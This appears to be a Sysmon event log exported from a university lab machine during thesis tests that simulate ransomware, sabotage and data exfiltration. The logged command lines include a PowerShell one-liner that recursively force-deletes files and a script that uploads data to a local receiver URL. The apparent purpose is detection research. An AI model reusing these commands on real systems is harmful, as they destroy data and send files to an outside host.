 ""LogonId"": ""0x28CA01"",
 ""TerminalSessionId"": ""1"",
 ""IntegrityLevel"": ""High"",
 ""Hashes"": ""MD5=DFD66604CA0898E8E26DF7B1635B6326,SHA256=D23B67799A0DA0143E395BA5DB906A22AB08FAC4BD5581E275B1E0F1B3FAC55C,IMPHASH=88CB9A420410BDA787E305B65518A934"",
 ""ParentProcessGuid"": ""{6bc49a7d-8d4d-6a53-a205-000000009a01}"",
 ""ParentProcessId"": ""1716"",
 ""ParentImage"": ""C:\\Windows\\System32\\cmd.exe"",
 ""ParentCommandLine"": ""\""cmd.exe\"" /d /c powershell.exe -NoProfile -ExecutionPolicy Bypass -File \""C:\\Users\\seguridad\\Desktop\\TFM\\01_ACTIVE_TESTS\\Pruebas\\TEC-007_Ransomware\\crear_directorio_dummy.ps1\"" "",
 ""ParentUser"": ""LT29\\seguridad""
}",C.364907172793f8c7
1783860655303,11,2026-07-12T12:49:10.0852453Z,"{
 ""RuleName"": ""-"",
 ""UtcTime"": ""2026-07-12 12:49:17.307"",
 ""ProcessGuid"": ""{6bc49a7d-8d4d-6a53-a305-000000009a01}"",
 ""ProcessId"": 1384,
 ""Image"": ""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"",
 ""TargetFilename"": ""C:\\Users\\seguridad\\AppData\\Local\\Temp\\__PSScriptPolicyTest_ctnyzhy2.oc2.ps1"",
 ""CreationUtcTime"": ""2026-07-12 12:49:17.307"",
 ""User"": ""LT29\\seguridad""
}",C.364907172793f8c7
1783860655303,1,2026-07-12T12:49:34.6364683Z,"{
 ""RuleName"": ""-"",
 ""UtcTime"": ""2026-07-12 12:49:43.712"",
 ""ProcessGuid"": ""{6bc49a7d-8d67-6a53-a405-000000009a01}"",
 ""ProcessId"": 2100,
 ""Image"": ""C:\\Windows\\System32\\cmd.exe"",
 ""FileVersion"": ""10.0.19041.746 (WinBuild.160101.0800)"",
 ""Description"": ""Windows Command Processor"",
 ""Product"": ""Microsoft® Windows® Operating System"",
 ""Company"": ""Microsoft Corporation"",
 ""OriginalFileName"": ""Cmd.Exe"",
 ""CommandLine"": ""\""cmd.exe\"" /d /c powershell.exe -NoProfile -ExecutionPolicy Bypass -File \""C:\\Users\\seguridad\\Desktop\\TFM\\01_ACTIVE_TESTS\\Pruebas\\TEC-008_Sabotaje\\crear_directorio_dummy.ps1\"" "",
 ""CurrentDirectory"": ""C:\\Windows\\system32\\"",
 ""User"": ""LT29\\seguridad"",
 ""LogonGuid"": ""{6bc49a7d-7a59-6a53-01ca-280000000000}"",
 ""LogonId"": ""0x28CA01"",
 ""TerminalSessionId"": ""1"",
 ""IntegrityLevel"": ""High"",
 ""Hashes"": ""MD5=8A2122E8162DBEF04694B9C3E0B6CDEE,SHA256=B99D61D874728EDC0918CA0EB10EAB93D381E7367E377406E65963366C874450,IMPHASH=272245E2988E1E430500B852C4FB5E18"",
 ""ParentProcessGuid"": ""{6bc49a7d-7f1e-6a53-1c04-000000009a01}"",
 ""ParentProcessId"": ""12104"",
 ""ParentImage"": ""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"",
 ""ParentCommandLine"": ""\""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\"" "",
 ""ParentUser"": ""LT29\\seguridad""
}",C.364907172793f8c7
1783860655303,1,2026-07-12T12:49:34.6846685Z,"{
 ""RuleName"": ""-"",
 ""UtcTime"": ""2026-07-12 12:49:43.751"",
 ""ProcessGuid"": ""{6bc49a7d-8d67-6a53-a505-000000009a01}"",
 ""ProcessId"": 3848,
 ""Image"": ""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"",
 ""FileVersion"": ""10.0.19041.3393 (WinBuild.160101.0800)"",
 ""Description"": ""Windows PowerShell"",
 ""Product"": ""Microsoft® Windows® Operating System"",
 ""Company"": ""Microsoft Corporation"",
 ""OriginalFileName"": ""PowerShell.EXE"",
 ""CommandLine"": ""powershell.exe  -NoProfile -ExecutionPolicy Bypass -File \""C:\\Users\\seguridad\\Desktop\\TFM\\01_ACTIVE_TESTS\\Pruebas\\TEC-008_Sabotaje\\crear_directorio_dummy.ps1\"" "",
 ""CurrentDirectory"": ""C:\\Windows\\system32\\"",
 ""User"": ""LT29\\seguridad"",
 ""LogonGuid"": ""{6bc49a7d-7a59-6a53-01ca-280000000000}"",
 ""LogonId"": ""0x28CA01"",
 ""TerminalSessionId"": ""1"",
 ""IntegrityLevel"": ""High"",
 ""Hashes"": ""MD5=DFD66604CA0898E8E26DF7B1635B6326,SHA256=D23B67799A0DA0143E395BA5DB906A22AB08FAC4BD5581E275B1E0F1B3FAC55C,IMPHASH=88CB9A420410BDA787E305B65518A934"",
 ""ParentProcessGuid"": ""{6bc49a7d-8d67-6a53-a405-000000009a01}"",
 ""ParentProcessId"": ""2100"",
 ""ParentImage"": ""C:\\Windows\\System32\\cmd.exe"",
 ""ParentCommandLine"": ""\""cmd.exe\"" /d /c powershell.exe -NoProfile -ExecutionPolicy Bypass -File \""C:\\Users\\seguridad\\Desktop\\TFM\\01_ACTIVE_TESTS\\Pruebas\\TEC-008_Sabotaje\\crear_directorio_dummy.ps1\"" "",
 ""ParentUser"": ""LT29\\seguridad""
}",C.364907172793f8c7
1783860655303,11,2026-07-12T12:49:34.8479648Z,"{
 ""RuleName"": ""-"",
 ""UtcTime"": ""2026-07-12 12:49:43.915"",
 ""ProcessGuid"": ""{6bc49a7d-8d67-6a53-a505-000000009a01}"",
 ""ProcessId"": 3848,
 ""Image"": ""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"",
 ""TargetFilename"": ""C:\\Users\\seguridad\\AppData\\Local\\Temp\\__PSScriptPolicyTest_b1rgbo2l.bnr.ps1"",
 ""CreationUtcTime"": ""2026-07-12 12:49:43.915"",
 ""User"": ""LT29\\seguridad""
}",C.364907172793f8c7
1783860655303,3,2026-07-12T12:49:49.3179303Z,"{
 ""RuleName"": ""Usermode"",
 ""UtcTime"": ""2026-07-12 12:50:01.300"",
 ""ProcessGuid"": ""{6bc49a7d-7cd5-6a53-7102-000000009a01}"",
 ""ProcessId"": 5276,
 ""Image"": ""C:\\Users\\seguridad\\Desktop\\TFM\\Velociraptor\\velociraptor-v0.75.6-windows-amd64.exe"",
 ""User"": ""LT29\\seguridad"",
 ""Protocol"": ""tcp"",
 ""Initiated"": ""false"",
 ""SourceIsIpv6"": ""true"",
 ""SourceIp"": ""0:0:0:0:0:0:0:1"",
 ""SourceHostname"": ""LT29.ait.us.es"",
 ""SourcePort"": ""50647"",
 ""SourcePortName"": ""-"",
 ""DestinationIsIpv6"": ""true"",
 ""DestinationIp"": ""0:0:0:0:0:0:0:1"",
 ""DestinationHostname"": ""LT29.ait.us.es"",
 ""DestinationPort"": ""8443"",
 ""DestinationPortName"": ""-""
}",C.364907172793f8c7
1783860655303,3,2026-07-12T12:49:49.3179496Z,"{
 ""RuleName"": ""Usermode"",
 ""UtcTime"": ""2026-07-12 12:50:01.456"",
 ""ProcessGuid"": ""{6bc49a7d-7cd5-6a53-7102-000000009a01}"",
 ""ProcessId"": 5276,
 ""Image"": ""C:\\Users\\seguridad\\Desktop\\TFM\\Velociraptor\\velociraptor-v0.75.6-windows-amd64.exe"",
 ""User"": ""LT29\\seguridad"",
 ""Protocol"": ""tcp"",
 ""Initiated"": ""false"",
 ""SourceIsIpv6"": ""true"",
 ""SourceIp"": ""0:0:0:0:0:0:0:1"",
 ""SourceHostname"": ""LT29.ait.us.es"",
 ""SourcePort"": ""50648"",
 ""SourcePortName"": ""-"",
 ""DestinationIsIpv6"": ""true"",
 ""DestinationIp"": ""0:0:0:0:0:0:0:1"",
 ""DestinationHostname"": ""LT29.ait.us.es"",
 ""DestinationPort"": ""8443"",
 ""DestinationPortName"": ""-""
}",C.364907172793f8c7
1783860655303,1,2026-07-12T12:49:50.2385077Z,"{
 ""RuleName"": ""-"",
 ""UtcTime"": ""2026-07-12 12:49:57.183"",
 ""ProcessGuid"": ""{6bc49a7d-8d75-6a53-a705-000000009a01}"",
 ""ProcessId"": 6920,
 ""Image"": ""C:\\Windows\\System32\\cmd.exe"",
 ""FileVersion"": ""10.0.19041.746 (WinBuild.160101.0800)"",
 ""Description"": ""Windows Command Processor"",
 ""Product"": ""Microsoft® Windows® Operating System"",
 ""Company"": ""Microsoft Corporation"",
 ""OriginalFileName"": ""Cmd.Exe"",
 ""CommandLine"": ""\""cmd.exe\"" /d /c powershell.exe -NoProfile -ExecutionPolicy Bypass -Command \""$target = 'C:\\Users\\seguridad\\Desktop\\TFM\\01_ACTIVE_TESTS\\Pruebas\\DUMB_LAB'; Write-Host 'TEC008_OK'; Get-ChildItem $target -Recurse -File | ForEach-Object { Remove-Item $_.FullName -Force }; Start-Sleep 3\"""",
 ""CurrentDirectory"": ""C:\\Windows\\system32\\"",
 ""User"": ""LT29\\seguridad"",
 ""LogonGuid"": ""{6bc49a7d-7a59-6a53-01ca-280000000000}"",
 ""LogonId"": ""0x28CA01"",
 ""TerminalSessionId"": ""1"",
 ""IntegrityLevel"": ""High"",
 ""Hashes"": ""MD5=8A2122E8162DBEF04694B9C3E0B6CDEE,SHA256=B99D61D874728EDC0918CA0EB10EAB93D381E7367E377406E65963366C874450,IMPHASH=272245E2988E1E430500B852C4FB5E18"",
 ""ParentProcessGuid"": ""{6bc49a7d-7f1e-6a53-1c04-000000009a01}"",
 ""ParentProcessId"": ""12104"",
 ""ParentImage"": ""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"",
 ""ParentCommandLine"": ""\""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\"" "",
 ""ParentUser"": ""LT29\\seguridad""
}",C.364907172793f8c7
1783860655303,1,2026-07-12T12:49:50.3805587Z,"{
 ""RuleName"": ""-"",
 ""UtcTime"": ""2026-07-12 12:49:57.271"",
 ""ProcessGuid"": ""{6bc49a7d-8d75-6a53-a805-000000009a01}"",
 ""ProcessId"": 7956,
 ""Image"": ""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"",
 ""FileVersion"": ""10.0.19041.3393 (WinBuild.160101.0800)"",
 ""Description"": ""Windows PowerShell"",
 ""Product"": ""Microsoft® Windows® Operating System"",
 ""Company"": ""Microsoft Corporation"",
 ""OriginalFileName"": ""PowerShell.EXE"",
 ""CommandLine"": ""powershell.exe  -NoProfile -ExecutionPolicy Bypass -Command \""$target = 'C:\\Users\\seguridad\\Desktop\\TFM\\01_ACTIVE_TESTS\\Pruebas\\DUMB_LAB'; Write-Host 'TEC008_OK'; Get-ChildItem $target -Recurse -File | ForEach-Object { Remove-Item $_.FullName -Force }; Start-Sleep 3\"""",
 ""CurrentDirectory"": ""C:\\Windows\\system32\\"",
 ""User"": ""LT29\\seguridad"",
 ""LogonGuid"": ""{6bc49a7d-7a59-6a53-01ca-280000000000}"",
 ""LogonId"": ""0x28CA01"",
 ""TerminalSessionId"": ""1"",
 ""IntegrityLevel"": ""High"",
 ""Hashes"": ""MD5=DFD66604CA0898E8E26DF7B1635B6326,SHA256=D23B67799A0DA0143E395BA5DB906A22AB08FAC4BD5581E275B1E0F1B3FAC55C,IMPHASH=88CB9A420410BDA787E305B65518A934"",
 ""ParentProcessGuid"": ""{6bc49a7d-8d75-6a53-a705-000000009a01}"",
 ""ParentProcessId"": ""6920"",
 ""ParentImage"": ""C:\\Windows\\System32\\cmd.exe"",
 ""ParentCommandLine"": ""\""cmd.exe\"" /d /c powershell.exe -NoProfile -ExecutionPolicy Bypass -Command \""$target = 'C:\\Users\\seguridad\\Desktop\\TFM\\01_ACTIVE_TESTS\\Pruebas\\DUMB_LAB'; Write-Host 'TEC008_OK'; Get-ChildItem $target -Recurse -File | ForEach-Object { Remove-Item $_.FullName -Force }; Start-Sleep 3\"""",
 ""ParentUser"": ""LT29\\seguridad""
}",C.364907172793f8c7
1783860655303,11,2026-07-12T12:49:50.7265637Z,"{
 ""RuleName"": ""-"",
 ""UtcTime"": ""2026-07-12 12:49:57.562"",
 ""ProcessGuid"": ""{6bc49a7d-8d75-6a53-a805-000000009a01}"",
 ""ProcessId"": 7956,
 ""Image"": ""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"",
 ""TargetFilename"": ""C:\\Users\\seguridad\\AppData\\Local\\Temp\\__PSScriptPolicyTest_jw1sigfa.qlo.ps1"",
 ""CreationUtcTime"": ""2026-07-12 12:49:57.554"",
 ""User"": ""LT29\\seguridad""
}",C.364907172793f8c7
1783860655303,1,2026-07-12T12:49:57.0048652Z,"{
 ""RuleName"": ""-"",
 ""UtcTime"": ""2026-07-12 12:50:02.702"",
 ""ProcessGuid"": ""{6bc49a7d-8d7a-6a53-a905-000000009a01}"",
 ""ProcessId"": 9116,
 ""Image"": ""C:\\Windows\\System32\\cmd.exe"",
 ""FileVersion"": ""10.0.19041.746 (WinBuild.160101.0800)"",
 ""Description"": ""Windows Command Processor"",
 ""Product"": ""Microsoft® Windows® Operating System"",
 ""Company"": ""Microsoft Corporation"",
 ""OriginalFileName"": ""Cmd.Exe"",
 ""CommandLine"": ""\""cmd.exe\"" /d /c powershell.exe -NoProfile -ExecutionPolicy Bypass -File \""C:\\Users\\seguridad\\Desktop\\TFM\\01_ACTIVE_TESTS\\Pruebas\\TEC-008_Sabotaje\\crear_directorio_dummy.ps1\"" "",
 ""CurrentDirectory"": ""C:\\Windows\\system32\\"",
 ""User"": ""LT29\\seguridad"",
 ""LogonGuid"": ""{6bc49a7d-7a59-6a53-01ca-280000000000}"",
 ""LogonId"": ""0x28CA01"",
 ""TerminalSessionId"": ""1"",
 ""IntegrityLevel"": ""High"",
 ""Hashes"": ""MD5=8A2122E8162DBEF04694B9C3E0B6CDEE,SHA256=B99D61D874728EDC0918CA0EB10EAB93D381E7367E377406E65963366C874450,IMPHASH=272245E2988E1E430500B852C4FB5E18"",
 ""ParentProcessGuid"": ""{6bc49a7d-7f1e-6a53-1c04-000000009a01}"",
 ""ParentProcessId"": ""12104"",
 ""ParentImage"": ""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"",
 ""ParentCommandLine"": ""\""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\"" "",
 ""ParentUser"": ""LT29\\seguridad""
}",C.364907172793f8c7
1783860655303,1,2026-07-12T12:49:57.0389809Z,"{
 ""RuleName"": ""-"",
 ""UtcTime"": ""2026-07-12 12:50:02.725"",
 ""ProcessGuid"": ""{6bc49a7d-8d7a-6a53-aa05-000000009a01}"",
 ""ProcessId"": 8668,
 ""Image"": ""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"",
 ""FileVersion"": ""10.0.19041.3393 (WinBuild.160101.0800)"",
 ""Description"": ""Windows PowerShell"",
 ""Product"": ""Microsoft® Windows® Operating System"",
 ""Company"": ""Microsoft Corporation"",
 ""OriginalFileName"": ""PowerShell.EXE"",
 ""CommandLine"": ""powershell.exe  -NoProfile -ExecutionPolicy Bypass -File \""C:\\Users\\seguridad\\Desktop\\TFM\\01_ACTIVE_TESTS\\Pruebas\\TEC-008_Sabotaje\\crear_directorio_dummy.ps1\"" "",
 ""CurrentDirectory"": ""C:\\Windows\\system32\\"",
 ""User"": ""LT29\\seguridad"",
 ""LogonGuid"": ""{6bc49a7d-7a59-6a53-01ca-280000000000}"",
 ""LogonId"": ""0x28CA01"",
 ""TerminalSessionId"": ""1"",
 ""IntegrityLevel"": ""High"",
 ""Hashes"": ""MD5=DFD66604CA0898E8E26DF7B1635B6326,SHA256=D23B67799A0DA0143E395BA5DB906A22AB08FAC4BD5581E275B1E0F1B3FAC55C,IMPHASH=88CB9A420410BDA787E305B65518A934"",
 ""ParentProcessGuid"": ""{6bc49a7d-8d7a-6a53-a905-000000009a01}"",
 ""ParentProcessId"": ""9116"",
 ""ParentImage"": ""C:\\Windows\\System32\\cmd.exe"",
 ""ParentCommandLine"": ""\""cmd.exe\"" /d /c powershell.exe -NoProfile -ExecutionPolicy Bypass -File \""C:\\Users\\seguridad\\Desktop\\TFM\\01_ACTIVE_TESTS\\Pruebas\\TEC-008_Sabotaje\\crear_directorio_dummy.ps1\"" "",
 ""ParentUser"": ""LT29\\seguridad""
}",C.364907172793f8c7
1783860655303,11,2026-07-12T12:49:57.1824614Z,"{
 ""RuleName"": ""-"",
 ""UtcTime"": ""2026-07-12 12:50:02.855"",
 ""ProcessGuid"": ""{6bc49a7d-8d7a-6a53-aa05-000000009a01}"",
 ""ProcessId"": 8668,
 ""Image"": ""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"",
 ""TargetFilename"": ""C:\\Users\\seguridad\\AppData\\Local\\Temp\\__PSScriptPolicyTest_mpriqwb0.3xz.ps1"",
 ""CreationUtcTime"": ""2026-07-12 12:50:02.855"",
 ""User"": ""LT29\\seguridad""
}",C.364907172793f8c7
1783860655303,1,2026-07-12T12:50:23.7401237Z,"{
 ""RuleName"": ""-"",
 ""UtcTime"": ""2026-07-12 12:50:28.528"",
 ""ProcessGuid"": ""{6bc49a7d-8d94-6a53-ac05-000000009a01}"",
 ""ProcessId"": 8024,
 ""Image"": ""C:\\Windows\\System32\\cmd.exe"",
 ""FileVersion"": ""10.0.19041.746 (WinBuild.160101.0800)"",
 ""Description"": ""Windows Command Processor"",
 ""Product"": ""Microsoft® Windows® Operating System"",
 ""Company"": ""Microsoft Corporation"",
 ""OriginalFileName"": ""Cmd.Exe"",
 ""CommandLine"": ""\""cmd.exe\"" /d /c powershell.exe -NoProfile -ExecutionPolicy Bypass -File \""C:\\Users\\seguridad\\Desktop\\TFM\\01_ACTIVE_TESTS\\Pruebas\\TEC-009_Exfiltracion\\crear_directorio_dummy.ps1\"" "",
 ""CurrentDirectory"": ""C:\\Windows\\system32\\"",
 ""User"": ""LT29\\seguridad"",
 ""LogonGuid"": ""{6bc49a7d-7a59-6a53-01ca-280000000000}"",
 ""LogonId"": ""0x28CA01"",
 ""TerminalSessionId"": ""1"",
 ""IntegrityLevel"": ""High"",
 ""Hashes"": ""MD5=8A2122E8162DBEF04694B9C3E0B6CDEE,SHA256=B99D61D874728EDC0918CA0EB10EAB93D381E7367E377406E65963366C874450,IMPHASH=272245E2988E1E430500B852C4FB5E18"",
 ""ParentProcessGuid"": ""{6bc49a7d-7f1e-6a53-1c04-000000009a01}"",
 ""ParentProcessId"": ""12104"",
 ""ParentImage"": ""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"",
 ""ParentCommandLine"": ""\""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\"" "",
 ""ParentUser"": ""LT29\\seguridad""
}",C.364907172793f8c7
1783860655303,1,2026-07-12T12:50:23.7813507Z,"{
 ""RuleName"": ""-"",
 ""UtcTime"": ""2026-07-12 12:50:28.562"",
 ""ProcessGuid"": ""{6bc49a7d-8d94-6a53-ad05-000000009a01}"",
 ""ProcessId"": 6448,
 ""Image"": ""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"",
 ""FileVersion"": ""10.0.19041.3393 (WinBuild.160101.0800)"",
 ""Description"": ""Windows PowerShell"",
 ""Product"": ""Microsoft® Windows® Operating System"",
 ""Company"": ""Microsoft Corporation"",
 ""OriginalFileName"": ""PowerShell.EXE"",
 ""CommandLine"": ""powershell.exe  -NoProfile -ExecutionPolicy Bypass -File \""C:\\Users\\seguridad\\Desktop\\TFM\\01_ACTIVE_TESTS\\Pruebas\\TEC-009_Exfiltracion\\crear_directorio_dummy.ps1\"" "",
 ""CurrentDirectory"": ""C:\\Windows\\system32\\"",
 ""User"": ""LT29\\seguridad"",
 ""LogonGuid"": ""{6bc49a7d-7a59-6a53-01ca-280000000000}"",
 ""LogonId"": ""0x28CA01"",
 ""TerminalSessionId"": ""1"",
 ""IntegrityLevel"": ""High"",
 ""Hashes"": ""MD5=DFD66604CA0898E8E26DF7B1635B6326,SHA256=D23B67799A0DA0143E395BA5DB906A22AB08FAC4BD5581E275B1E0F1B3FAC55C,IMPHASH=88CB9A420410BDA787E305B65518A934"",
 ""ParentProcessGuid"": ""{6bc49a7d-8d94-6a53-ac05-000000009a01}"",
 ""ParentProcessId"": ""8024"",
 ""ParentImage"": ""C:\\Windows\\System32\\cmd.exe"",
 ""ParentCommandLine"": ""\""cmd.exe\"" /d /c powershell.exe -NoProfile -ExecutionPolicy Bypass -File \""C:\\Users\\seguridad\\Desktop\\TFM\\01_ACTIVE_TESTS\\Pruebas\\TEC-009_Exfiltracion\\crear_directorio_dummy.ps1\"" "",
 ""ParentUser"": ""LT29\\seguridad""
}",C.364907172793f8c7
1783860655303,11,2026-07-12T12:50:23.9589463Z,"{
 ""RuleName"": ""-"",
 ""UtcTime"": ""2026-07-12 12:50:28.759"",
 ""ProcessGuid"": ""{6bc49a7d-8d94-6a53-ad05-000000009a01}"",
 ""ProcessId"": 6448,
 ""Image"": ""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"",
 ""TargetFilename"": ""C:\\Users\\seguridad\\AppData\\Local\\Temp\\__PSScriptPolicyTest_cajtbvlt.ljf.ps1"",
 ""CreationUtcTime"": ""2026-07-12 12:50:28.759"",
 ""User"": ""LT29\\seguridad""
}",C.364907172793f8c7
1783860655303,1,2026-07-12T12:50:41.0789816Z,"{
 ""RuleName"": ""-"",
 ""UtcTime"": ""2026-07-12 12:50:49.188"",
 ""ProcessGuid"": ""{6bc49a7d-8da9-6a53-af05-000000009a01}"",
 ""ProcessId"": 1780,
 ""Image"": ""C:\\Windows\\System32\\cmd.exe"",
 ""FileVersion"": ""10.0.19041.746 (WinBuild.160101.0800)"",
 ""Description"": ""Windows Command Processor"",
 ""Product"": ""Microsoft® Windows® Operating System"",
 ""Company"": ""Microsoft Corporation"",
 ""OriginalFileName"": ""Cmd.Exe"",
 ""CommandLine"": ""\""cmd.exe\"" /d /c powershell.exe -NoProfile -ExecutionPolicy Bypass -File \""C:\\Users\\seguridad\\Desktop\\TFM\\01_ACTIVE_TESTS\\Pruebas\\TEC-009_Exfiltracion\\exfiltracion_v3.ps1\"" -ReceiverUrl \""http://192.168.1.129:8088/upload\"" -TimeoutSec 60 -EnableUpload -KeepArtifacts"",
 ""CurrentDirectory"": ""C:\\Windows\\system32\\"",
 ""User"": ""LT29\\seguridad"",
 ""LogonGuid"": ""{6bc49a7d-7a59-6a53-01ca-280000000000}"",
 ""LogonId"": ""0x28CA01"",
 ""TerminalSessionId"": ""1"",
 ""IntegrityLevel"": ""High"",
 ""Hashes"": ""MD5=8A2122E8162DBEF04694B9C3E0B6CDEE,SHA256=B99D61D874728EDC0918CA0EB10EAB93D381E7367E377406E65963366C874450,IMPHASH=272245E2988E1E430500B852C4FB5E18"",
 ""ParentProcessGuid"": ""{6bc49a7d-7f1e-6a53-1c04-000000009a01}"",
 ""ParentProcessId"": ""12104"",
 ""ParentImage"": ""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"",
 ""ParentCommandLine"": ""\""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\"" "",
 ""ParentUser"": ""LT29\\seguridad""
}",C.364907172793f8c7
1783860655303,1,2026-07-12T12:50:41.1552215Z,"{
 ""RuleName"": ""-"",
 ""UtcTime"": ""2026-07-12 12:50:49.258"",
 ""ProcessGuid"": ""{6bc49a7d-8da9-6a53-b005-000000009a01}"",
 ""ProcessId"": 11476,
 ""Image"": ""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"",
 ""FileVersion"": ""10.0.19041.3393 (WinBuild.160101.0800)"",
 ""Description"": ""Windows PowerShell"",
 ""Product"": ""Microsoft® Windows® Operating System"",
 ""Company"": ""Microsoft Corporation"",
 ""OriginalFileName"": ""PowerShell.EXE"",
 ""CommandLine"": ""powershell.exe  -NoProfile -ExecutionPolicy Bypass -File \""C:\\Users\\seguridad\\Desktop\\TFM\\01_ACTIVE_TESTS\\Pruebas\\TEC-009_Exfiltracion\\exfiltracion_v3.ps1\"" -ReceiverUrl \""http://192.168.1.129:8088/upload\"" -TimeoutSec 60 -EnableUpload -KeepArtifacts"",
 ""CurrentDirectory"": ""C:\\Windows\\system32\\"",
 ""User"": ""LT29\\seguridad"",
 ""LogonGuid"": ""{6bc49a7d-7a59-6a53-01ca-280000000000}"",
 ""LogonId"": ""0x28CA01"",
 ""TerminalSessionId"": ""1"",
 ""IntegrityLevel"": ""High"",
 ""Hashes"": ""MD5=DFD66604CA0898E8E26DF7B1635B6326,SHA256=D23B67799A0DA0143E395BA5DB906A22AB08FAC4BD5581E275B1E0F1B3FAC55C,IMPHASH=88CB9A420410BDA787E305B65518A934"",
 ""ParentProcessGuid"": ""{6bc49a7d-8da9-6a53-af05-000000009a01}"",
 ""ParentProcessId"": ""1780"",
 ""ParentImage"": ""C:\\Windows\\System32\\cmd.exe"",
 ""ParentCommandLine"": ""\""cmd.exe\"" /d /c powershell.exe -NoProfile -ExecutionPolicy Bypass -File \""C:\\Users\\seguridad\\Desktop\\TFM\\01_ACTIVE_TESTS\\Pruebas\\TEC-009_Exfiltracion\\exfiltracion_v3.ps1\"" -ReceiverUrl \""http://192.168.1.129:8088/upload\"" -TimeoutSec 60 -EnableUpload -KeepArtifacts"",
 ""ParentUser"": ""LT29\\seguridad""
}",C.364907172793f8c7
1783860655303,11,2026-07-12T12:50:41.3922558Z,"{
 ""RuleName"": ""-"",
 ""UtcTime"": ""2026-07-12 12:50:49.584"",
 ""ProcessGuid"": ""{6bc49a7d-8da9-6a53-b005-000000009a01}"",
 ""ProcessId"": 11476,
 ""Image"": ""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"",
 ""TargetFilename"": ""C:\\Users\\seguridad\\AppData\\Local\\Temp\\__PSScriptPolicyTest_oezp3b3i.tys.ps1"",
 ""CreationUtcTime"": ""2026-07-12 12:50:49.584"",
 ""User"": ""LT29\\seguridad""
}",C.364907172793f8c7
1783860655303,3,2026-07-12T12:50:43.2804546Z,"{
 ""RuleName"": ""-"",
 ""UtcTime"": ""2026-07-12 12:50:54.117"",
 ""ProcessGuid"": ""{6bc49a7d-7f1e-6a53-1c04-000000009a01}"",
 ""ProcessId"": 12104,
 ""Image"": ""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"",
 ""User"": ""LT29\\seguridad"",
 ""Protocol"": ""tcp"",
 ""Initiated"": ""true"",
 ""SourceIsIpv6"": ""false"",
 ""SourceIp"": ""192.168.1.143"",
 ""SourceHostname"": ""LT29.ait.us.es"",
 ""SourcePort"": ""50651"",
 ""SourcePortName"": ""-"",
 ""DestinationIsIpv6"": ""false"",
 ""DestinationIp"": ""192.168.1.129"",
 ""DestinationHostname"": ""-"",
 ""DestinationPort"": ""8088"",
 ""DestinationPortName"": ""-""
}",C.364907172793f8c7
1783860779912,3,2026-07-12T12:50:52.5313286Z,"{
 ""RuleName"": ""Usermode"",
 ""UtcTime"": ""2026-07-12 12:51:02.711"",
 ""ProcessGuid"": ""{6bc49a7d-7cd5-6a53-7102-000000009a01}"",
 ""ProcessId"": 5276,
 ""Image"": ""C:\\Users\\seguridad\\Desktop\\TFM\\Velociraptor\\velociraptor-v0.75.6-windows-amd64.exe"",
 ""User"": ""LT29\\seguridad"",
 ""Protocol"": ""tcp"",
 ""Initiated"": ""false"",
 ""SourceIsIpv6"": ""true"",
 ""SourceIp"": ""0:0:0:0:0:0:0:1"",
 ""SourceHostname"": ""LT29.ait.us.es"",
 ""SourcePort"": ""50652"",
 ""SourcePortName"": ""-"",
 ""DestinationIsIpv6"": ""true"",
 ""DestinationIp"": ""0:0:0:0:0:0:0:1"",
 ""DestinationHostname"": ""LT29.ait.us.es"",
 ""DestinationPort"": ""8443"",
 ""DestinationPortName"": ""-""
}",C.364907172793f8c7
1783860779912,3,2026-07-12T12:50:52.5313518Z,"{
 ""RuleName"": ""Usermode"",
 ""UtcTime"": ""2026-07-12 12:51:02.726"",
 ""ProcessGuid"": ""{6bc49a7d-7cd5-6a53-7102-000000009a01}"",
 ""ProcessId"": 5276,
 ""Image"": ""C:\\Users\\seguridad\\Desktop\\TFM\\Velociraptor\\velociraptor-v0.75.6-windows-amd64.exe"",
 ""User"": ""LT29\\seguridad"",
 ""Protocol"": ""tcp"",
 ""Initiated"": ""false"",
 ""SourceIsIpv6"": ""true"",
 ""SourceIp"": ""0:0:0:0:0:0:0:1"",
 ""SourceHostname"": ""LT29.ait.us.es"",
 ""SourcePort"": ""50653"",
 ""SourcePortName"": ""-"",
 ""DestinationIsIpv6"": ""true"",
 ""DestinationIp"": ""0:0:0:0:0:0:0:1"",
 ""DestinationHostname"": ""LT29.ait.us.es"",
 ""DestinationPort"": ""8443"",
 ""DestinationPortName"": ""-""
}",C.364907172793f8c7
1783860779912,3,2026-07-12T12:50:59.4125297Z,"{
 ""RuleName"": ""-"",
 ""UtcTime"": ""2026-07-12 12:51:10.716"",
 ""ProcessGuid"": ""{6bc49a7d-8da9-6a53-b005-000000009a01}"",
 ""ProcessId"": 11476,
 ""Image"": ""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"",
 ""User"": ""LT29\\seguridad"",
 ""Protocol"": ""tcp"",
 ""Initiated"": ""true"",
 ""SourceIsIpv6"": ""false"",
 ""SourceIp"": ""192.168.1.143"",
 ""SourceHostname"": ""LT29.ait.us.es"",
 ""SourcePort"": ""50654"",
 ""SourcePortName"": ""-"",
 ""DestinationIsIpv6"": ""false"",
 ""DestinationIp"": ""192.168.1.129"",
 ""DestinationHostname"": ""-"",
 ""DestinationPort"": ""8088"",
 ""DestinationPortName"": ""-""
}",C.364907172793f8c7
